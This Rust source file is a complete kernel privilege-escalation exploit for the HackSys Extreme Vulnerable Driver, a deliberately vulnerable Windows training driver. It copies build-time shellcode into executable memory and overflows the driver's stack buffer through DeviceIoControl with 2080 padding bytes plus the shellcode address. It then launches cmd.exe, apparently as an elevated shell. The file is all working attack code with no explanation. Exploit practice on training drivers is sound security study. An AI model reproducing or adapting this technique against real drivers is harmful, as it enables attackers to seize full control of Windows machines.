use winapi::um::fileapi::CreateFileA;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::ioapiset::DeviceIoControl;
use std::ptr::null_mut;
use std::process::Command;

fn main() {
    unsafe {
        exploit();
    }
    Command::new("cmd.exe").status().expect("failed :/");
}

unsafe fn exploit() {
    let shellcode = include_bytes!(concat!(env!("OUT_DIR"), "/shellcode"));
    let filename = br"\\.\HackSysExtremeVulnerableDriver\0";
    let fd = CreateFileA(filename.as_ptr() as _, 0xC0000000, 0, null_mut(), 0x3, 0, null_mut());
    let alloc = VirtualAlloc(null_mut(), 0x100, 0x3000, 0x40) as *mut u8;

    alloc.copy_from(shellcode.as_ptr() as *mut u8, shellcode.len());

    let mut data = vec![b'A'; 2080];
    let bytes = (alloc as usize).to_le_bytes();

    data.extend_from_slice(&bytes);

    DeviceIoControl(fd, 0x222003, data.as_ptr() as _, data.len() as _, null_mut(), 0,  &mut 0, null_mut());
}
